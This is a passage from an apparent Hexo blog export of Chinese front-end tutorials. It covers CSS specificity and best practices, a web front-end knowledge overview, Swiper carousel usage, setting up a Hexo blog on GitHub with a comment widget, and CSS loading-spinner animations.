span）的层次低。通配符选择器它的值是最低的，几乎等于零。可以说所有的选择器都优先于它。排在后面的是元素选择器，它的值是1。然后是带有伪元素的元素，这个结合起来值是2。一直如此下去。最高值是元素选择器、ID选择器、class选择器再加上一个元素选择器的组合，这个组合的值是112。一个ID选择器的值差不多就是100了。（这段不大懂得话详见下表）这里提供一个CSS特殊层次结构的概述。下边有个简单的表格可以帮助你快速找到层次，不用你自己去计算。如果你想要更深入了解的话，可以参考下这篇我写的短文，不然你经常会需要回看这个表格。CSS层次特性表： 第二条：避免使用!important声明第二条实践和层次结构也有关系。接下来两条也是如此。我希望这会让你知道特殊的层次结构的重要性。言归正传，这条实践就是永远不要使用!improtant声明。为什么我会把杜绝!improtant放在CSS的最佳实践里呢。原因是因为它会导致你不能避免的恶性循环。 惹祸上身想象下你和一个用!improtant声明的人工作在一块。你不得不再次用!imprtant声明来覆盖样式。你能怎么办呢？你有几个方案可供选择。第一你可以冒险移除你同事用的!improtant声明，后果是可能会破坏掉一些东西，你需要测试保证移除完所有东西依旧运行良好。但是这会花费很多时间。那么需要考虑下值不值得这样去做。第二个选择是运用你的CSS层次结构知识。解决这个声明的办法就是提高选择器的层级。假设你的同事是用一个span元素加上一个类名，这意味着你需要的是比一个class选择器更高的级别，这个值是10。你可以有几种选择实现。第一种是用两个元素选择器和一个class选择器。第二种是用一个ID选择器。第三种是元素选择器+ID选择器+类选择器+元素选择器。但你在接下来会认识到用ID不是CSS的最佳实践，所以你会排除这个选项，所以这意味着你不得不用两个元素选择器加上一个类选择器，否则你会违背其他的CSS最佳实践。 解决!improtant问题我所举的例子可能看起来不算什么大问题。但当发现你不得不再次覆盖!improtant时会发生什么状况？这就是使用improtant的问题所在。前一个总是会传染给下一个。这就是我所说的恶性循环。你用了一个!important后很快你会不得已使用另一个。所以我相信唯一的解决办法就是不要使用!improtant。处理这个声明的方式类似于对待毒品。最好的办法就是坚持CSS最佳实践然后永远不要起这个头。否则就是自找麻烦。这也是我鼓励你使用 CSSlinter的原因。因为你可能很容易又会忘了这条实践。所以使用一些工具来测试你的代码是有效良好的。而且如果你使用Gulp，你可以使用gulp-csslint或者gulp-sass-lint，只要力所能及都应该实现自动化。 第三条：不要使用ID样式化元素时千万不要用ID。为什么说它属于CSS最佳实践呢？第一，ID是不可复用的，你只能在一个页面中用一个特定的ID元素。所以如果你想要在同一个页面样式化更多的元素，你需要使用更多的ID和更多行的CSS。第二，这是恶性循环的开始，我又要扯到CSS层次结构了。我们在前边的!improtant中有提到这个。第三，对于ID的争议是它通常用来指特定的元素，那么你就不可能让你的CSS变得简短又可复用。让样式太过特制化不是个好主意。相反的你应该让样式更具抽象和通用性。这可以帮助你重复地使用同一个样式。如果你在每个页面都用了超过一个特定的ID，那么可复用的CSS这个目标就不可能实现。 那么性能呢？确实ID选择器的运行速度比class选择器要快。如果你定义了1000条规则，ID的性能会快一毫秒。这是在你只在一个页面定义了一个ID选择器的情况下发生的，所以这并不是什么显著的性能优势。而且你只有在至少定义了1000规则之后才能获得这个优势，对于小项目来说这通常是一个还蛮大的数字。我们还必须考虑的另一件事是额外的ID选择器会带来什么性能影响。==理论上当你添加任何ID选择器时，性能优势其实已经没有了。==而且如果你想获得任何性能优势的话，你不能在ID后边添加其他选择器。如果添加了像class或者元素选择器会发生什么呢？浏览器会从右到左阅读CSS，这意味着后边添加的选择器会首先被读取到，ID的速度优势也就被冲击掉了。结论就是性能提升的唯一途径必须通过纯ID的选择器。同时你需要有足够多的CSS规则让优势显现。既然1000条规则可以有一毫秒的优势，那么你应该把目标放在100,000条规则上。这个大概可以给到100毫秒的优势。另外的事就是浏览器扫描渲染这么多CSS规则需要的时间。所以你应该避免使用ID为妙。 什么时候适合使用ID在进入下一条实践前我先再说多一点。我是主张从你的CSS或者SASS中摆脱掉ID，但这不意味着你需要完全地从HTML标记中移除掉它。ID有一个具体的用例，就是使用到JS。正如讨论过的ID更快，所以能用来提升你的JS速度，同样的JS有个getElementByID()方法。这个方法用来获取带有ID的元素，你可以使用ID作为唯一标识符来赋给需要额外功能的元素。这样做的另一个好处就是分离CSS和JS。当你从一个元素中去掉class时，你不用担心会破坏掉JS。所有你的JS只需要关联到ID即可。但是我还是想说我并不喜欢使用ID。当我用到JS绑定时，我会使用带有”js-“前缀的class。这帮我区分哪些类是用于样式哪些是用于JS。现在我只会在一种状况下使用JS，在通过href属性给页面中某个元素绑定锚标记的时候。这样用户点击锚标记时页面会滚动到特定的区域。除了这个例子我不认为其他地方有需要使用到ID。 第四条：避免层次过高的元素我保证这是最后一条关于CSS层次结构的最佳实践。层次过高的元素是什么意思？就是你给一个元素赋予了过多复杂的选择器。假设你想要一个锚标记表现得像一个按钮，符合最佳实践的做法是使用像btn类的东西，你的CSS或者SASS样式表可能就会包含像.btn {…}的代码。当你使用了这个选择器，可能就会有类似a.btn{…}的代码，更极端点之后会变成a.btn.btn-big.btn-primary{…}。重点就是使用元素选择器变得没有必要。这同样适用于其他附加的类。你完全可以只用.btn类。所以避免使用层次过高的选择器可以有三个理由，一是你会想压缩的CSS大小写更少的CSS，和你要想要提高选择器的性能。 使用层次过高的元素的问题我多次提到浏览器阅读CSS是从右到左。同时浏览器也在选择位于每个选择器后的元素。比如aricle h1{...}，浏览器会先寻找所有h1标签，然后寻找所有内嵌在article标签里的h1标签。那么按钮的例子呢，浏览器会先寻找带有.btn-primary的元素，然后是同时带有.btn-primary和.btn-big的元素。a和.btn选择器同理。综上所述，浏览器需要四个周期来呈现一个按钮。这高效得了吗？想象下你为了买些小东西会跑四趟超市吗？你当然会一次性买齐所有的吧。因此浏览器若在一个周期内完成，按钮的渲染才不会浪费时间。网站变得更快可以提升用户体验，避免层次过高的元素会让浏览器渲染CSS更快些。更快的CSS渲染意味着你的站点会加载得更快。这就是你的目标。所以避开层级过高的元素意味着实现良好的用户体验。 第五条：reset还是normalize思考下这个问题，当你开始一个新项目，你会先重置所有的元素的默认样式吗？如果没有的话我建议你把这部分加入你的工作流程里去。为什么呢？不同的浏览器会试图以不同的方式渲染一些CSS样式。这导致了或大或小的不一致设计。结果就是你的网站在Chrome，Firefox，Edge都会看起来有点不一样。试想下当你在客户端打开你的站点时发现布局乱套了。你可以通过让浏览器渲染一致来解决这个问题。有两件事是你可以做的，一，自己手动重置所有元素，这可能会花费一些时间。如果每个项目都这样，可能并不高效。那么第二种方式就是使用预制的CSS样式表，把重置的样式表放在你主要的样式表前边即可。 reset还是normalize当你选择第二种方式时，你需要考虑多一件事。你会采用哪种样式表来使浏览器呈现一致？目前有两种样式表可选，Nicolas Gallagher和Jonathan Neal写的Normalize或Eric A. Meyer写的Reset。这两种样式表是不同的，它们遵循不同的方法来移除浏览器的不一致性。Normalize只着眼于常规正确的样式；同时旨在保留默认样式，没有完全移除它们。它包含了一些小的修正来提高可用性。它也相对来说更模块化些，你可以提取或删除你不需要的部分。Reset样式表则不太一样。它通过移除所有的样式来达成同质化的视觉样式，给几乎所有元素设定了广泛性的默认样式。它除去了所有的样式像粗体斜体等等。结果就是strong、em、span看起来都差不多。从这个角度讲，reset就像一个大锤子，normalize则像一把手术刀。reset坚决地重置所有东西，normalize则是重置需要重置的。因此这些样式表的代码和文件大小也是不同的。当然这些区别并不是很重要，但是它们是确实存在的。不管怎样，你应该选择哪个呢？看你更喜欢哪种方式了。如果你想要一个彻彻底底的重置，就选择reset。如果不需要那么极端的话就选择normalize。别忘了在normalize里添上些可用性的改进。我个人是偏爱Normalize的。 第六条：别重置所有东西假定你同意重置了，但不要急于下载运行。这并不和上一条矛盾。你需要考虑清楚你是不是真的需要这个东西。无论是normalize还是reset，都包含了大量你可能不会运用到你的项目里的元素。因此没有必要让这个代码扩大你的CSS。我的建议同时也是CSS最佳实践的第六条，是去定制预制的样式表。你需要选择你会用到的样式。当然，少数的额外几行CSS并不会对性能或者文件大小有什么太大影响。但是这不代表你可以浪费资源。如果想要用户体验良好，你需要利用一切机会去优化你的网站，这就是其中一个。要记得所有这些样式表是会在很多种不同状况下工作的，这意味着你项目中一半的代码是没有用的。同时你个人的编码风格可能会覆盖掉一些这样的代码，这些重复性的东西是可以删除的。另一个解剖和定制样式表的原因是能得到更好地理解，当你分离reset或者normalize时，你可以清楚看到原本是什么东西。结果就是你会知道它们是怎么工作的。这些样式表是由专业的Web开发者维护的。光是阅读源码和进行运用你就可以学习到很多东西。也可能帮助你找到更适合自己的样式表。 不要想CSS最佳实践了这就是今天我带给你的所有CSS最佳实践。我相信这六条会帮助你提升你的CSS代码。让我们快速回顾一下，第一，掌握CSS特殊的层次结构。这是CSS经常被忽略的一部分。但是你能看到今天许多最佳实践都和它有关。第二，避免使用improtant声明，同时不要使用ID进行样式书写。这两件事可以避免恶性循环。之后是避免层级过高的元素。它会让浏览器执行过多渲染你样式的不必要周期。这会降低性能和带来不佳的用户体验。最后是使用reset或者normalize样式表来避免浏览器的不一致。但要确保根据你具体的状况来量身定制。不然的话就会让你的CSS变得冗杂。关于本文译者：@安生原文：http://blog.alexdevero.com/css-best-practices-become-css-ninja-pt1/ 转自：前端早读课]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web前端技术栈🐥]]></title>
      <url>%2F2016%2F03%2F02%2F9%2F</url>
      <content type="text"><![CDATA[转自http://www.haonanji.cn/230.html 1. 前言本文把整个web前端开发所需要的知识都之中在一个视图中，形成一个完整的web前端知识体系，目的是想要颠覆人们对于前端只有三大块（html、css、js）的认识——做web前端需要的比这三大块要多得多。 在看内容之前，先看一下这个知识框架的预览图。图太大不好展示，看不清除，可在此下载清晰版：http://pan.baidu.com/s/1hqIUvUc（内有整个知识体系的图片和xmind文件）。 2.分类所有知识框架，那肯定是一个结构型的展现，就是一棵树。web前端的知识点非常多，也非常散，需要好几层结构来组织这个体系，否则就会显得很乱。那么如何组织、把谁和谁放在一块儿？这是真正值得我们去思考的，你也可以自己来思考一下这个问题。在我总结的这个知识框架中，首先第一层我划分为：理论知识，类库框架，编码开发，运行环境。如下图： 接下来给大家解释一下:这个图要从下往上看，为何？——因为下面是上面的基础； 首先，我们需要一定的理论知识，不管是你听别人讲授、自己看书还是网上淘资料，你都需要一定的理论知识，每一种程序开发，都避免不了。 第二，有了这些理论知识我们就可以编码了——不错——but，没有人能抵挡住第三方框架和类库的诱惑，例如jquery； 第三，有了这些理论知识和协助我们的类库框架，我们就可真正的编码了。大家可能以为编码开发不就是写代码吗，还有啥？——这里面道道多着呢； 最后，开发程序的目的，最终是为了能高效、稳定的运行在相应的环境中，这其中又有哪些事情需要我们去做？请期待； 3. 理论知识 包括“软知识”和“硬知识”“软知识”和“硬知识”大家可能觉得词陌生，其实我一说大家就能明白。 所谓“软”的就是能在各个程序开发中都用到的，算是基本功、内功，例如数据结构、算法、设计模式、面向对象等等； 所谓“硬”的就是能直接用于本程序开发的。用C语言你就得学C语言语法，此时学java没用。我们web前端开发所需要的硬知识其实都包含在三个标准里面：http标准、W3C标准和ECMAScript标准； 4.1 http标准为什么做web前端要了解http标准？——因为浏览器要从服务端获取网页，网页也可能将信息再提交给服务器，这其中都有http的连接。web系统既然和http链接有瓜葛，你就必须去了解它。 我的意见是：你不必去非常了解http的详细内容，但是你要了解web前端开发常用的一些http的知识——就是上图中我列出来的那些。当然，我知识列了一个纲，详细内容还得靠你自己去查阅（本文章讲的是知识框架，不会涉及任何知识点的详细内容） 关于这方面的知识，建议去查阅《图解http》这本书，浅显易懂的讲述了这些内容，我曾经也看过。 4.2 W3C标准如果说你只知道web前端的一个标准，估计肯定是W3C标准了（据我了解，貌似大部分人真的都只知道这一个标准）。它的内容非常多，看看www.w3.org/TR/这个页面。写到这里让我想起了一句话：2/8原则——20%的功能满足80%的需求。我觉得这句话用到这里非常合适，我们在平时开发过程中根本用不到这么多东西。反而，你要把平时用的多的东西搞懂了。下图的这些知识，我想不用再过多解释了，这就是我文章开发说的“三大块”（html、css、js）。现在你要知道，它们只不多是W3C标准的一部分，而W3C标准也只是web前端开发知识体系中的一部分而已。（下图没有完全展开，想看权展开的图，可下载本文一开始提供的附件） 关于CSS的基础知识，毛遂自荐一下自己之前的一篇系列博客：《CSS知多少》 4.3 ECMAScript简称ES，写全称太麻烦了。有些人可能只知道javascript，而不知道ES——其实，js是在ES的基础上，为web浏览器做了一部分封装（增加了DOM操作、BOM操作等）。 如上图中的这些概念，大家可能平时都在javascript中看到，其实他们是ES的内容。只不过javascript继承了ES的这些特性，并且javascript用的比较广泛，因此才会在js中讨论的多一些。还是那个“2/8原则”。其实ES中的内容也非常多，而且更新很快，现在都到ES6了。但是我上图中列出来的这些都是最重要的概念。如果你不懂原型、闭包和作用域，那就说明你还不完全了解ES，也就是不完全会用javascript。在此毛遂自荐自己之前的一篇系列博客，大家可以去参考：《深入理解javascript原型和闭包系列 框架和类库前面已经描述完了web前端开发所需要的理论知识。如何实践呢？——不能蛮干——还得绕世界去看看，有哪些大牛已经为我们做出了如此多的贡献。用下面的这些类库或者框架，能大大提高你的开发效率。 首先，jquery一定是大部分web前端开发者不可或缺的工具。而我利用jquery不仅仅停留在只使用它的API和插件上，我还会自己去写jquery插件，我还会去读jquery的源码、了解jquery的设计思路。如果你也能那样做，请相信我，你会收获到意想不到的效果。如果有一个问题：怎样才能最最透彻的理解javascript的事件系统？最佳答案之一：读几遍（一遍可能读不懂）jquery关于事件处理部分的源码！ bootstrap不用再过多解释了吧，从github上的排名也能看出道道来。甚至连我们公司的UI设计师，都从bootstrap上截图作为素材。 fontAwesome 是全世界最强大的图标系统。相比于css制作图标来说，这个要好很多倍，不管是开发、效率还是维护上。icomoon.io能让我自定义选择自己的图标文件。 requirejs和seajs这种模块定义系统，也一定是你系统中不可或缺的。我曾经看过一个教程，讲师就说：requirejs带来了既jquery之后的第二次前端技术变革。 其他的，backbone、angular、react这些也慢慢的开始发挥了他们的价值，此处精力有限就不再赘述了——但是，他们很重要——你至少要试着去了解它们。 6. 编码开发要问编码IDE哪家强，当然要属微软的visual studio！但是即便是微软的VS最新版本，它也代替不了下面要说的这套开发环境。 如果你专门做web前端，就不要在用vs了，当然要选择sublime。写html语句还用手动一条一条写吗？你得需要zencoding的协助，否则效率太差了。另外，针对html、css、js的压缩、合并、语法检查，文件的清除、复制这些操作，你还要手动去做吗？——你需要grunt或者gulp的帮助。在此毛遂自荐自己的教程《用grunt搭建自动化web开发环境》，讲的比较详细，适合初学者学习。如果你的系统中有比较多的js代码或者文件，请选择一个合适的模块定义规范——CMD / AMD。请用git来帮助你做文件版本管理，最简单的就是使用github。调试、测试，也都有专门的工具，都是需要学的……——我的天哪……这些字写到现在写的我的手都酸了，别说要学习这些知识了——再也别说我们web前端是“三大块”了！ 7. 运行环境当系统真正到了运行环境中，当你觉得终于完事儿的时候，其实还有好几个知识点需要你掌握。看下图： 首先，你要知道web系统虽然大部分是在浏览器下运行，但是js可能会被运行在node环境。在浏览器环境下，最重要的两点是：web安全和性能优化。需要注意的纲要我都列出来了，如果想了解推荐两本书《白帽子将web安全》《高性能网站建设指南》 8. 其他以上这些是全部的知识体系。如果你想成为一名合格的、让leader喜欢的程序猿，你除了知道这些知识之外，我觉得还需要以下几点： 要了解敏捷软件开发流程（如SCRUM）和项目管理知识（如考取PMP），这也属于一种“软”知识吧； 要学会在网上和别人交流（博客、qq群、开源项目），交流能让自己看到自己的不足； 要学会自我反省和自我学习。就像我现在一样，试着自己总结一下属于自己的东西，随时反省随时进步。 来自：http://www.cnblogs.com/wangfupeng1988/p/4649709.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Swiper用法小总结🌸]]></title>
      <url>%2F2016%2F02%2F25%2F8%2F</url>
      <content type="text"><![CDATA[最近在研究swiper。在使用的过程中对swiper有个更具体的了解。下面就让我们来看看swiper吧~ 关于swiper Swiper 是一款免费以及轻量级的移动设备触控滑块的js框架,使用硬件加速过渡（如果该设备支持的话）。主要使用于移动端的网站、移动web apps,native apps和hybrid apps。主要是为IOS而设计的,同时,在Android、WP8系统也有着良好的用户体验,Swiper从3.0开始不再全面支持PC端。因此,如需在PC上兼容更多的浏览器,可以选择Swiper2.x（甚至支持IE7）。(转自官网) 使用1.大家可以在 http://www.swiper.com.cn 官方文档中查看swiper的用法和下载swiper文件。2.Swiper使用2.1 加载swiper插件&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; ... &lt;link rel=&quot;stylesheet&quot; href=&quot;path/to/swiper.min.css&quot;&gt; &lt;/head&gt; &lt;body&gt; ... &lt;script src=&quot;path/to/swiper.min.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 2.2 html内容&lt;div class=&quot;swiper-container&quot;&gt; &lt;div class=&quot;swiper-wrapper&quot;&gt; &lt;div class=&quot;swiper-slide&quot;&gt;Slide 1&lt;/div&gt; &lt;div class=&quot;swiper-slide&quot;&gt;Slide 2&lt;/div&gt; &lt;div class=&quot;swiper-slide&quot;&gt;Slide 3&lt;/div&gt; &lt;/div&gt; &lt;!-- 如果需要分页器 --&gt; &lt;div class=&quot;swiper-pagination&quot;&gt;&lt;/div&gt; &lt;!-- 如果需要导航按钮 --&gt; &lt;div class=&quot;swiper-button-prev&quot;&gt;&lt;/div&gt; &lt;div class=&quot;swiper-button-next&quot;&gt;&lt;/div&gt; &lt;!-- 如果需要滚动条 --&gt; &lt;div class=&quot;swiper-scrollbar&quot;&gt;&lt;/div&gt; &lt;/div&gt; 导航等组件可以放在container之外 2.3 swiper初始化&lt;script&gt; var mySwiper = new Swiper (&apos;.swiper-container&apos;, { direction: &apos;vertical&apos;, loop: true, // 如果需要分页器 pagination: &apos;.swiper-pagination&apos;, // 如果需要前进后退按钮 nextButton: &apos;.swiper-button-next&apos;, prevButton: &apos;.swiper-button-prev&apos;, // 如果需要滚动条 scrollbar: &apos;.swiper-scrollbar&apos;, }) &lt;/script&gt; 3.Swiper Animate使用方法3.1 使用Swiper Animate需要加载swiper.animate.min.js和animate.min.css,初始化代码如下&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; ... &lt;link rel=&quot;stylesheet&quot; href=&quot;path/to/swiper.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;path/to/animate.min.css&quot;&gt; &lt;/head&gt; &lt;body&gt; ... &lt;script src=&quot;path/to/swiper.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;path/to/swiper.animate.min.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 3.2 初始化时隐藏元素并在需要开始的时刻开始动画&lt;script&gt; var mySwiper = new Swiper (&apos;.swiper-container&apos;, { onInit: function(swiper){ //Swiper2.x的初始化是onFirstInit swiperAnimateCache(swiper); //隐藏动画元素 swiperAnimate(swiper); //初始化完成开始动画 }, onSlideChangeEnd: function(swiper){ swiperAnimate(swiper); //每个slide切换结束时也运行当前slide动画 } }) &lt;/script&gt; 3.3 在需要运动的元素上面增加类名ani,Swiper Animate需要指定几个参数：swiper-animate-effect：切换效果,例如 fadeInUp swiper-animate-duration：可选,动画持续时间（单位秒）,例如 0.5s swiper-animate-delay：可选,动画延迟时间（单位秒）,例如 0.3s &lt;div class=&quot;swiper-slide&quot;&gt; &lt;p class=&quot;ani&quot; swiper-animate-effect=&quot;fadeInUp&quot; swiper-animate-duration=&quot;0.5s&quot; swiper-animate-delay=&quot;0.3s&quot;&gt;内容&lt;/p&gt; &lt;/div&gt; 3.4 动画效果可参考Animate.css,如果里面的效果都不是我们想要的,我们可以仿照Animate.css的格式仿写其他效果,我在做这个项目的时候就是自己写了些动画进去 下面就项目中遇到的小技巧,自己稍微总结一下~ 1.swiper中,如果设置为loop时,控制前后的按钮中index值就不好用,因为循环找不到开始和结束,如果设置为loop,前后按钮就没有颜色的变化。2.使用swiper插件的时候,如果想要对一个元素进行多个动画,则可以加多个父级div等,对div进行动画的添加,从而达到想要实现的动画效果。3.嵌套swiper的时候如果到添加的swiper出现,原来的swiper不能滑动,则在添加swiper上加swiper-no-swiping,noSwiping:false, 原来的swiper,的,js里面添加noSwiping:true,属性。4.swiper1._slideTo(index);swiper滑动到第index页的函数。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用GitHub来搭建Hexo博客]]></title>
      <url>%2F2016%2F02%2F18%2F7%2F</url>
      <content type="text"><![CDATA[最近总算是使用GitHub搭建了自己的博客，趁热乎赶紧来记录下搭建过程~ 初步搭建过程 1. 你需要有一个Github的账号，如果没有可以注册，很简单的~ 2. 进到Github新建一个项目，项目的名字是自己的用户名+.github.io，比如我建的项目仓库的名字就是’menggeNiu.github.io’，然后把这个项目仓库克隆到本地，这个操作除了通过终端来进行，还可以使用GitHub Desktop，我觉得后者更加方便。 3. 接下来就是打开克隆到本地的文件夹，我习惯再在里面建一个文件夹，如blog，进入建的文件夹，我们就可以开始安装hexo了。 4. 现在我们开始安装hexo。hexo是在node支持下运行的，如果没有node可以去官网下载。安装hexo，命令如下，安装结束之后可以执行hexo -v来检查是否安装成功。sudo npm install hero -g 5. hexo初始化，，命令如下，然后会在文件夹里自动生成文件hexo init 6.config.yml文件配置：deploy字段下面添加type: git repo: 域名仓库的https地址 6. 启动本地文件，命令如下，执行之后，终端里会有输出http://localhost:4000/，在浏览器输入网址，就可以看到在本地跑起来的自己的博客了，当然此时的主题是默认的主题。我感觉也还不错，哈哈~hexo server 7.发布7.1 首先安装git，输入如下命令npm install hexo-deployer-git --save 7.2 再输入如下命令，就文成博客发布了，现在我们可以输入博客域名来看我们自己的博客了~hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 创建新的博客文章 1.进入项目所在文件夹，输入下面的命令，执行过后会在source/_posts文件夹里产生刚才创建的文件，后缀为md。hexo new 此处为文章的名字 2.写md文件，可以使用Mou，我用下来感觉还是蛮好用的。 3.如果使用Mou写的话，将写完的内容直接复制粘贴到新创建的文件夹中，然后执行命令：//转义命令 hexo g 4.如果想在本地看效果，再执行命令：//服务器跑起来 hexo server 5.最后发布，发布命令：//发布命令 hexo d 6.这样就发布了一篇你的新博客了~怎么样，是不是好开心~有了自己的博客，我是好开心的，哈哈哈~ 更换主题 1.首先在github上找到你喜欢的主题。 2.进入到theme文件夹，执行命令：git clone https://github.com/iissnan/hexo-theme-next 3.执行上列命令之后，下载的主题包就会出现在theme文件夹中，这时，在根目录下的_config.yml文件中，将theme后面的字段替换为想要更换主题的字段，然后再hexo clean &amp;&amp; hexo g &amp;&amp; hexo d就可以换起新主题啦~当然，有关主题的设置，可以进入到对应主题文件夹根目录下的_config.yml文件中进行更改，其他样式什么的也可以更改，我暂时还没有改，如果想改的小伙伴可以去对应的css文件或者其他文件进行更改哦~ 添加评论 1.评论系统可以使用duoshuo。 2.http://duoshuo.com/进入多说官网，注册，按照步骤逐步完成域名绑定等。 3.绑定成功之后，你的博客的站点会出现在右上角，最左边的选项中，点进去。 4.点击设置，记住域名中的二级域名，即.duoshuo.com之前的字符串。 5.再回到我们的本地博客文件中，这个评论的设置由于主题的不同而不同，大致的思路就是，在_config.yml文件中如果没有duoshuo_shortname的填上这个字段，并把刚才记下的二级域名的名字写上，如果主题中有duoshuo字段的，直接在主题的_config.yml文件中添加刚才的字段，然后把主题/layout/下面的comments.ejs里面的代码替换为duoshuo的默认代码，代码如下：&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.duoshuo_shortname){ %&gt; &lt;section id=&quot;comments&quot;&gt; &lt;!-- 多说评论框 start --&gt; &lt;div class=&quot;ds-thread&quot; data-thread-key=&quot;&lt;%= post.layout %&gt;-&lt;%= post.slug %&gt;&quot; data-title=&quot;&lt;%= post.title %&gt;&quot; data-url=&quot;&lt;%= page.permalink %&gt;&quot;&gt;&lt;/div&gt; &lt;!-- 多说评论框 end --&gt; &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt; &lt;script type=&quot;text/javascript&quot;&gt; var duoshuoQuery = {short_name:&apos;&lt;%= config.duoshuo_shortname %&gt;&apos;}; (function() { var ds = document.createElement(&apos;script&apos;); ds.type = &apos;text/javascript&apos;;ds.async = true; ds.src = (document.location.protocol == &apos;https:&apos; ? &apos;https:&apos; : &apos;http:&apos;) + &apos;//static.duoshuo.com/embed.js&apos;; ds.charset = &apos;UTF-8&apos;; (document.getElementsByTagName(&apos;head&apos;)[0] || document.getElementsByTagName(&apos;body&apos;)[0]).appendChild(ds); })(); &lt;/script&gt; &lt;!-- 多说公共JS代码 end --&gt; &lt;/section&gt; &lt;% } %&gt; 6.完成之后，再执行如下命令，稍等片刻，我们就可以在自己的博客看到评论功能已经添加进去了~`hexo clean &amp;&amp; hexo g &amp;&amp; hexo d` 以上就是我初步的搭建过程，还有很多不足，很多模块还没有添加进去，希望小伙伴们多多交流，一起完善哦~亲们一定要在网好的情况下转义和发布！我就被坑了~~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[加载旋转二]]></title>
      <url>%2F2016%2F02%2F11%2F6%2F</url>
      <content type="text"><![CDATA[今天也是用css动画来完成一个加载转圈效果哦~感觉比上次加载旋转的效果棒多了，哈哈，body颜色也是喜欢的颜色~不多说，下面上css代码，就是用css动画来完成的~&lt;style style=&quot;text/css&quot;&gt; body{ margin: 0; background:rgb(13,206,203) } div{ width: 20px; height: 20px; border-radius: 50%; background-color:transparent; margin: 200px auto; animation-name: turn; animation-duration: 2s; animation-iteration-count: infinite; animation-timing-function: linear; } @keyframes turn{ 0%,100%{box-shadow: 0 -50px 0 rgb(215,246,246),35.25px -35.25px rgb(167,237,236),rgb(61,214,212), -50px 0 rgb(61,214,212), -35.25px -35.25px rgb(167,237,236); } 12.5%{box-shadow: 0 -50px rgb(167,237,236),35.25px -35.25px rgb(215,246,246),50px 0 rgb(167,237,236), 35.25px 35.25px rgb(61,214,212),0 50px rgb(61,214,212),-35.250px 35.250px rgb(61,214,212),-50px 0 rgb(61,214,212),-35.25px -35.25px rgb(61,214,212);} 25%{box-shadow: 0 -50px rgb(61,214,212),35.25px -35.25px rgb(167,237,236),50px 0 rgb(215,246,246), 35.25px 35.25px rgb(167,237,236),0 50px rgb(61,214,212),-35.250px 35.250px rgb(61,214,212), -50px 0 rgb(61,214,212),-35.25px -35.25px rgb(61,214,212);} 37.5%{box-shadow: 0 -50px rgb(61,214,212),35.25px -35.25px rgb(61,214,212),50px 0 rgb(167,237,236), 35.25px 35.25px rgb(215,246,246),0 50px rgb(167,237,236),-35.250px 35.250px rgb(61,214,212), -50px 0 rgb(61,214,212),-35.25px -35.25px rgb(61,214,212);} 50%{box-shadow: 0 -50px rgb(61,214,212),35.25px -35.25px rgb(61,214,212),50px 0 rgb(61,214,212),35.25px 35.25px rgb(167,237,236),0 50px rgb(215,246,246),-35.250px 35.250px rgb(167,237,236), -50px 0 rgb(61,214,212),-35.25px -35.25px rgb(61,214,212);} 62.5%{box-shadow: 0 -50px rgb(61,214,212),35.25px -35.25px rgb(61,214,212),50px 0 rgb(61,214,212), 35.25px 35.25px rgb(61,214,212),0 50px rgb(167,237,236),-35.250px 35.250px rgb(215,246,246), -50px 0 rgb(167,237,236),-35.25px -35.25px rgb(61,214,212);} 75%{box-shadow: 0 -50px rgb(61,214,212),35.25px -35.25px rgb(61,214,212),50px 0 rgb(61,214,212),35.25px 35.25px rgb(61,214,212),0 50px rgb(61,214,212),-35.250px 35.250px rgb(167,237,236), -50px 0 rgb(215,246,246),-35.25px -35.25px rgb(167,237,236);} 87.5%{box-shadow: 0 -50px rgb(167,237,236),35.25px -35.25px rgb(61,214,212),50px 0 rgb(61,214,212), 35.25px 35.25px rgb(61,214,212),0 50px rgb(61,214,212),-35.250px 35.250px rgb(61,214,212), -50px 0 rgb(167,237,236),-35.25px -35.25px rgb(215,246,246);} &lt;/style&gt; 神奇的css，哈哈~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[加载旋转]]></title>
      <url>%2F2016%2F02%2F05%2F5%2F</url>
      <content type="text"><![CDATA[今天准备用一个div，和before，after伪类，通过css动画完成加载旋转的效果。@-webkit-keyframes load2 { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); } 100% {-webkit-transform: rotate(360deg); transform: rotate(360deg); } } @keyframes load2 { 0% {-webkit-transform: rotate(0deg); transform: rotate(0deg); } 100% {-webkit-transform: rotate(360deg); transform: rotate(360deg); } } 以上就是动画的代码，原理就是让div的before和after伪类进行上述动画，并让其中一个延迟动画几s，变会出现两个圆交替旋转的现象，怎么样，很简单吧~下面上css代码。&lt;style&gt; /*body{ background-color: #0dcecb; }*/ .loader, .loader:before, .loader:after { border-radius: 50%; } .loader:before, .loader:after { position: absolute; content: &apos;&apos;; } .loader:before { width: 5.2em; height: 10.2em; background: #0dcecb; border-radius: 10.2em 0 0 10.2em; top: -0.1em; left: -0.1em; -webkit-transform-origin: 5.2em 5.1em; transform-origin: 5.2em 5.1em; -webkit-animation: load2 2s infinite ease 1.5s; animation: load2 2s infinite ease 1.5s; } .loader { font-size: 11px; text-indent: -99999em; margin: 30% auto; position: relative; width: 10em; height: 10em; box-shadow: inset 0 0 0 1em yellow; } .loader:after { width: 5.2em; height: 10.2em; background: red; border-radius: 0 10.2em 10.2em 0; top: -0.1em; left: 5.1em; -webkit-transform-origin: 0px 5.1em; transform-origin: 0px 5.1em; -webkit-animation: load2 2s infinite ease; animation: load2 2s infinite ease; } @-webkit-keyframes load2 { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); transform: rotate(360deg); } } @keyframes load2 { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); transform: rotate(360deg); } } &lt;/style&gt; 以上就是今天的加载旋转小分享，等有时间再和大家分享另一种加载旋转效果~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS中各种size总结]]></title>
